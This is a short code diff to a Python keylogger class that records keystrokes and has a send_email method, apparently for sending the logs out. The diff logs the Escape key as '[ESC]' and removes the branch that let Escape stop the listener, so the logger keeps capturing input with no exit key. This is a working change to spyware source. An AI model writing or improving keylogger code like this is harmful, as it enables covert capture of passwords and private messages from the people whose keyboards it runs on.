@@ -14,6 +14,7 @@ class Keylogger:
     ks = {
         Key.space: " ",
         Key.enter: "[ENTER]\n",
+        Key.esc: "[ESC]",
         Key.tab: "[TAB]",
         Key.backspace: "[BACKSPACE]"}
 
@@ -31,9 +32,6 @@ class Keylogger:
             name = key.char
         except AttributeError:
             name = Keylogger.ks.get(key, str(key))
-        if key == Key.esc:
-            # stop listener
-            return False
         self.update_log(name.replace("'", ""))
 
     def send_email(self):
